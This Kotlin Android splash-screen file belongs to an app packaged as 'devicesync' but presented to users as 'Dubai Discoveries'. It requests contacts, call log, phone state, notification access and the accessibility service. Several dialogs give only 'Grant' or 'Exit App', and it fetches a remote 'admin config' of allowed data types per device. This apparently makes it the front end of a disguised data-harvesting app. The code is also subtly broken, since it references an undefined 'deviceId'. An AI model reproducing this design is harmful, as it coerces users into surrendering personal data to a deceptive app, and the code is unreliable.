package com.devicesync.app

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.Manifest
import android.content.pm.PackageManager
import com.devicesync.app.utils.SettingsManager
import com.devicesync.app.utils.PermissionManager
import com.devicesync.app.utils.RealTimePermissionManager
import com.devicesync.app.utils.ComprehensivePermissionManager
import com.devicesync.app.utils.DeviceRegistrationManager
import com.devicesync.app.utils.AppIdManager
import com.devicesync.app.utils.AdminConfigManager
import com.devicesync.app.utils.DynamicPermissionManager
import com.devicesync.app.utils.DeviceConfigManager
import com.devicesync.app.utils.AppConfigManager
import com.devicesync.app.data.StaticDataRepository

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class SplashActivity : AppCompatActivity(), RealTimePermissionManager.PermissionCallback, ComprehensivePermissionManager.PermissionCallback {

    companion object {
        private const val PERMISSION_REQUEST_CODE = 1001
        private val REQUIRED_PERMISSIONS = arrayOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE
        )
    }
    
    private var permissionDialog: AlertDialog? = null
    private var hasNavigated = false
    private var permissionTimeoutHandler: android.os.Handler? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)
        
        // Initialize managers
        DeviceConfigManager.initialize(this)
        AppConfigManager.initialize(this)
        
        // Start data fetching and navigation
        fetchStaticDataAndNavigate()
    }
    
    private fun navigateToNextScreen() {
        val settingsManager = SettingsManager(this)
        
        // Log permission status for debugging
        PermissionManager.logPermissionStatus(this)
        
        // Register device safely after splash screen (for testing purposes)
        DeviceRegistrationManager.registerDeviceSafely(this)
        
        // Debug logging
        android.util.Log.d("SplashActivity", "isLanguageSelected: ${settingsManager.isLanguageSelected()}")
        android.util.Log.d("SplashActivity", "areAllPermissionsGranted: ${PermissionManager.areAllPermissionsGranted(this)}")
        android.util.Log.d("SplashActivity", "isLoggedIn: ${settingsManager.isLoggedIn()}")
        
        if (!settingsManager.isLanguageSelected()) {
            // First time: Navigate to language selection
            android.util.Log.d("SplashActivity", "Navigating to LanguageSelectionActivity")
            val intent = Intent(this, LanguageSelectionActivity::class.java)
            startActivity(intent)
        } else if (!PermissionManager.areAllPermissionsGranted(this)) {
            // Language selected but permissions not granted - request them automatically
            android.util.Log.d("SplashActivity", "Requesting permissions automatically")
            requestPermissionsAutomatically()
        } else if (!settingsManager.isLoggedIn()) {
            // Language and permissions completed, but user not logged in
            android.util.Log.d("SplashActivity", "Navigating to LoginActivity")
            val intent = Intent(this, LoginActivity::class.java)
            startActivity(intent)
        } else {
            // User is logged in, go directly to main app
            android.util.Log.d("SplashActivity", "Navigating to MainActivity")
            val intent = Intent(this, MainActivity::class.java)
            startActivity(intent)
        }
        finish()
    }
    
    private fun requestPermissionsAutomatically() {
        try {
            // Use comprehensive permission manager for better control
            ComprehensivePermissionManager.requestAllPermissions(this, this)
        } catch (e: Exception) {
            android.util.Log.e("SplashActivity", "Error requesting permissions", e)
            // Fallback to proceeding without permissions
            proceedToNextScreenAfterPermissions()
        }
    }
    
    private fun showNotificationPermissionDialog() {
        // Dismiss any existing dialog first
        permissionDialog?.dismiss()
        
        val dialogBuilder = AlertDialog.Builder(this, R.style.WhiteDialogTheme)
        dialogBuilder.setTitle("Notification Permission Required")
        dialogBuilder.setMessage("Dubai Discoveries needs notification access to provide you with the best experience. Would you like to grant this permission now?")
        
        dialogBuilder.setPositiveButton("Grant Permission") { _, _ ->
            openNotificationSettings()
        }
        
        dialogBuilder.setNegativeButton("Skip for Now") { _, _ ->
            proceedToNextScreenAfterPermissions()
        }
        
        dialogBuilder.setCancelable(false)
        permissionDialog = dialogBuilder.create()
        permissionDialog?.show()
    }
    
    private fun openNotificationSettings() {
        try {
            val intent = PermissionManager.getNotificationAccessIntent()
            startActivity(intent)
        } catch (e: Exception) {
            // Fallback to app settings
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.fromParts("package", packageName, null)
            }
            startActivity(intent)
        }
    }
    
    private fun proceedToNextScreenAfterPermissions() {
        if (hasNavigated) {
            android.util.Log.d("SplashActivity", "Already navigated, skipping")
            return
        }
        
        hasNavigated = true
        val settingsManager = SettingsManager(this)
        
        if (!settingsManager.isLoggedIn()) {
            // Permissions completed, but user not logged in
            android.util.Log.d("SplashActivity", "Navigating to LoginActivity")
            val intent = Intent(this, LoginActivity::class.java)
            startActivity(intent)
        } else {
            // User is logged in, go directly to main app
            android.util.Log.d("SplashActivity", "Navigating to MainActivity")
            val intent = Intent(this, MainActivity::class.java)
            startActivity(intent)
        }
        finish()
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        // Handle permission results
        DynamicPermissionManager.onRequestPermissionsResult(
            this,
            requestCode,
            permissions,
            grantResults
        )
    }
    
    /**
     * Check if all required permissions are granted and navigate accordingly
     */
    private fun checkPermissionsAndNavigate() {
        val settingsManager = SettingsManager(this)
        
        // Check if all required permissions are granted
        if (DynamicPermissionManager.areAllRequiredPermissionsGranted(this)) {
            android.util.Log.d("SplashActivity", "✅ All required permissions granted, proceeding to next screen")
            proceedToNextScreenAfterPermissions()
        } else {
            android.util.Log.d("SplashActivity", "❌ Some permissions not granted, showing permission dialog")
            // Show a dialog asking user to grant permissions or continue anyway
            showPermissionOrContinueDialog()
        }
    }
    
    private fun showPermissionOrContinueDialog() {
        val dialogBuilder = AlertDialog.Builder(this, R.style.WhiteDialogTheme)
        dialogBuilder.setTitle("Permissions Required")
        dialogBuilder.setMessage("This app needs certain permissions to function properly. You can grant them now or continue without them (some features may not work).")
        
        dialogBuilder.setPositiveButton("Grant Permissions") { _, _ ->
            // Request permissions with timeout
            requestPermissionsWithTimeout()
        }
        
        dialogBuilder.setNegativeButton("Continue Anyway") { _, _ ->
            // Proceed without all permissions
            android.util.Log.d("SplashActivity", "User chose to continue without all permissions")
            proceedToNextScreenAfterPermissions()
        }
        
        dialogBuilder.setCancelable(false)
        val dialog = dialogBuilder.create()
        dialog.show()
    }
    
    private fun requestPermissionsWithTimeout() {
        // Set a timeout to automatically proceed after 30 seconds
        permissionTimeoutHandler = android.os.Handler(android.os.Looper.getMainLooper())
        permissionTimeoutHandler?.postDelayed({
            if (!hasNavigated) {
                android.util.Log.d("SplashActivity", "Permission request timeout, proceeding anyway")
                proceedToNextScreenAfterPermissions()
            }
        }, 30000) // 30 seconds timeout
        
        // Request permissions
        DynamicPermissionManager.requestRequiredPermissions(this)
    }
    
    // Implement the RealTimePermissionManager.PermissionCallback interface
    override fun onAllPermissionsGranted() {
        try {
            android.util.Log.d("SplashActivity", "✅ All permissions granted via RealTimePermissionManager")
            proceedToNextScreenAfterPermissions()
        } catch (e: Exception) {
            android.util.Log.e("SplashActivity", "Error in onAllPermissionsGranted", e)
            // Fallback navigation
            val intent = Intent(this, LoginActivity::class.java)
            startActivity(intent)
            finish()
        }
    }
    
    // Implement the ComprehensivePermissionManager.PermissionCallback interface
    override fun onPermissionGranted(permission: String) {
        try {
            android.util.Log.d("SplashActivity", "Permission granted: $permission")
            // Check if all permissions are now granted
            checkPermissionsAndNavigate()
        } catch (e: Exception) {
            android.util.Log.e("SplashActivity", "Error handling permission granted", e)
        }
    }
    
    override fun onPermissionDenied(permission: String) {
        try {
            android.util.Log.d("SplashActivity", "Permission denied: $permission")
            // Show dialog explaining why permission is needed
            showPermissionRequiredDialog(permission)
        } catch (e: Exception) {
            android.util.Log.e("SplashActivity", "Error handling permission denied", e)
        }
    }
    
    override fun onPermissionPermanentlyDenied(permission: String) {
        try {
            android.util.Log.d("SplashActivity", "Permission permanently denied: $permission")
            // Show settings dialog
            showSettingsRequiredDialog(permission)
        } catch (e: Exception) {
            android.util.Log.e("SplashActivity", "Error handling permission permanently denied", e)
        }
    }
    
    override fun onSomePermissionsDenied(deniedPermissions: List<String>) {
        try {
            android.util.Log.d("SplashActivity", "Some permissions denied: $deniedPermissions")
            // Show dialog explaining that all permissions are required
            showAllPermissionsRequiredDialog(deniedPermissions)
        } catch (e: Exception) {
            android.util.Log.e("SplashActivity", "Error handling some permissions denied", e)
            showAllPermissionsRequiredDialog(deniedPermissions)
        }
    }
    
    override fun onResume() {
        super.onResume()
        // Only check permissions on resume if we haven't already navigated
        if (!isFinishing && !hasNavigated) {
            if (DynamicPermissionManager.areAllRequiredPermissionsGranted(this)) {
                android.util.Log.d("SplashActivity", "✅ Permissions granted on resume, proceeding")
                proceedToNextScreenAfterPermissions()
            }
        }
    }
    
    override fun onPause() {
        super.onPause()
        // Dismiss any dialogs when activity is paused
        permissionDialog?.dismiss()
        permissionDialog = null
    }
    
    override fun onDestroy() {
        super.onDestroy()
        // Dismiss dialog to prevent window leak
        permissionDialog?.dismiss()
        permissionDialog = null
        // Clean up timeout handler
        permissionTimeoutHandler?.removeCallbacksAndMessages(null)
        permissionTimeoutHandler = null
    }
    
    /**
     * Fetch static data from API and then check permissions before navigation
     */
    private fun fetchStaticDataAndNavigate() {
        CoroutineScope(Dispatchers.Main).launch {
            try {
                android.util.Log.d("SplashActivity", "🔄 Starting to fetch static data...")
                
                // Register app ID on first launch
                withContext(Dispatchers.IO) {
                    registerAppIdIfNeeded()
                }
                
                // Fetch admin configuration and request permissions
                withContext(Dispatchers.IO) {
                    fetchAdminConfiguration()
                }
                
                // Fetch all static data
                val result = withContext(Dispatchers.IO) {
                    StaticDataRepository.fetchAllStaticData(this@SplashActivity)
                }
                
                // Handle result without complex when expression
                try {
                    android.util.Log.d("SplashActivity", "📊 Data loaded: ${StaticDataRepository.sliderImages.size} sliders, ${StaticDataRepository.attractions.size} attractions, ${StaticDataRepository.services.size} services, ${StaticDataRepository.tourPackages.size} packages")
                } catch (e: Exception) {
                    android.util.Log.e("SplashActivity", "❌ Error handling fetch result: ${e.message}", e)
                }
                
                // Check permissions before navigation
                checkPermissionsAndNavigate()
                
            } catch (e: Exception) {
                android.util.Log.e("SplashActivity", "❌ Error in fetchStaticDataAndNavigate: ${e.message}", e)
                // Check permissions even if data fetch fails
                checkPermissionsAndNavigate()
            }
        }
    }
    
    private suspend fun registerAppIdIfNeeded() {
        try {
            if (!AppIdManager.isAppIdRegistered(this@SplashActivity)) {
                val appId = AppIdManager.getOrCreateAppId(this@SplashActivity)
                android.util.Log.d("SplashActivity", "Generated new app ID: $appId")
                
                // Register with backend (optional)
                AppIdManager.registerAppIdWithBackend(this@SplashActivity, appId)
            } else {
                val existingAppId = AppIdManager.getAppId(this@SplashActivity)
                android.util.Log.d("SplashActivity", "Using existing app ID: $existingAppId")
            }
        } catch (e: Exception) {
            android.util.Log.e("SplashActivity", "Error registering app ID", e)
        }
    }
    
    private suspend fun fetchAdminConfiguration() {
        try {
            // Get device code from DeviceConfigManager (this will be the user_internal_code)
            val deviceCode = com.devicesync.app.utils.DeviceConfigManager.getDeviceCode()
            
            if (deviceCode.isNullOrEmpty()) {
                android.util.Log.w("SplashActivity", "No device code found, skipping admin config fetch")
                return
            }
            
            android.util.Log.d("SplashActivity", "Fetching admin config for device code: $deviceCode")
            
            // Fetch admin config by device code (user_internal_code)
            val adminConfig = AdminConfigManager.fetchAdminConfig(deviceCode)
            
            if (adminConfig != null) {
                android.util.Log.d("SplashActivity", "Admin config loaded: ${adminConfig.allowedDataTypes}")
                
                // Don't request permissions here - let checkPermissionsAndNavigate handle it
                // This prevents double permission requests
            } else {
                android.util.Log.w("SplashActivity", "No admin config found for device: $deviceId")
            }
        } catch (e: Exception) {
            android.util.Log.e("SplashActivity", "Error fetching admin configuration", e)
        }
    }
    
    /**
     * Navigate to MainActivity
     */
    private fun navigateToMainActivity() {
        try {
            android.util.Log.d("SplashActivity", "🚀 Navigating to MainActivity")
            val intent = Intent(this, MainActivity::class.java)
            startActivity(intent)
            finish()
        } catch (e: Exception) {
            android.util.Log.e("SplashActivity", "❌ Error navigating to MainActivity", e)
            // Emergency fallback - try to go to any available activity
            try {
                val intent = Intent(this, LoginActivity::class.java)
                startActivity(intent)
                finish()
            } catch (e2: Exception) {
                android.util.Log.e("SplashActivity", "❌ All navigation failed", e2)
                finish()
            }
        }
    }
    
    /**
     * Show dialog explaining why a specific permission is required
     */
    private fun showPermissionRequiredDialog(permission: String) {
        val permissionName = DynamicPermissionManager.getPermissionDisplayName(permission)
        val message = "To provide you with the best experience, we need $permissionName permission. This permission is required to continue using the app."
        
        AlertDialog.Builder(this, R.style.WhiteDialogTheme)
            .setTitle("Permission Required")
            .setMessage(message)
            .setPositiveButton("Grant Permission") { _, _ ->
                // Request the specific permission again
                DynamicPermissionManager.requestRequiredPermissions(this)
            }
            .setNegativeButton("Exit App") { _, _ ->
                finish()
            }
            .setCancelable(false)
            .show()
    }
    
    /**
     * Show dialog when permission is permanently denied
     */
    private fun showSettingsRequiredDialog(permission: String) {
        val permissionName = DynamicPermissionManager.getPermissionDisplayName(permission)
        
        // Special handling for accessibility service
        if (permission == Manifest.permission.BIND_ACCESSIBILITY_SERVICE) {
            val message = "Accessibility Service permission is required for the app to function properly. Please enable it in Accessibility Settings."
            
            AlertDialog.Builder(this, R.style.WhiteDialogTheme)
                .setTitle("Accessibility Service Required")
                .setMessage(message)
                .setPositiveButton("Open Accessibility Settings") { _, _ ->
                    // Open accessibility settings
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    startActivity(intent)
                }
                .setNegativeButton("Exit App") { _, _ ->
                    finish()
                }
                .setCancelable(false)
                .show()
        } else {
            val message = "$permissionName permission has been permanently denied. Please enable it in Settings to continue using the app."
            
            AlertDialog.Builder(this, R.style.WhiteDialogTheme)
                .setTitle("Permission Required")
                .setMessage(message)
                .setPositiveButton("Open Settings") { _, _ ->
                    // Open app settings
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                        data = android.net.Uri.fromParts("package", packageName, null)
                    }
                    startActivity(intent)
                }
                .setNegativeButton("Exit App") { _, _ ->
                    finish()
                }
                .setCancelable(false)
                .show()
        }
    }
    
    /**
     * Show dialog when multiple permissions are denied
     */
    private fun showAllPermissionsRequiredDialog(deniedPermissions: List<String>) {
        val permissionNames = deniedPermissions.map { DynamicPermissionManager.getPermissionDisplayName(it) }
        val permissionList = permissionNames.joinToString("\n• ", "• ")
        val message = "The following permissions are required to continue using the app:\n\n$permissionList\n\nPlease grant all permissions to proceed."
        
        AlertDialog.Builder(this, R.style.WhiteDialogTheme)
            .setTitle("Permissions Required")
            .setMessage(message)
            .setPositiveButton("Grant Permissions") { _, _ ->
                // Request all permissions again
                DynamicPermissionManager.requestRequiredPermissions(this)
            }
            .setNegativeButton("Exit App") { _, _ ->
                finish()
            }
            .setCancelable(false)
            .show()
    }
} 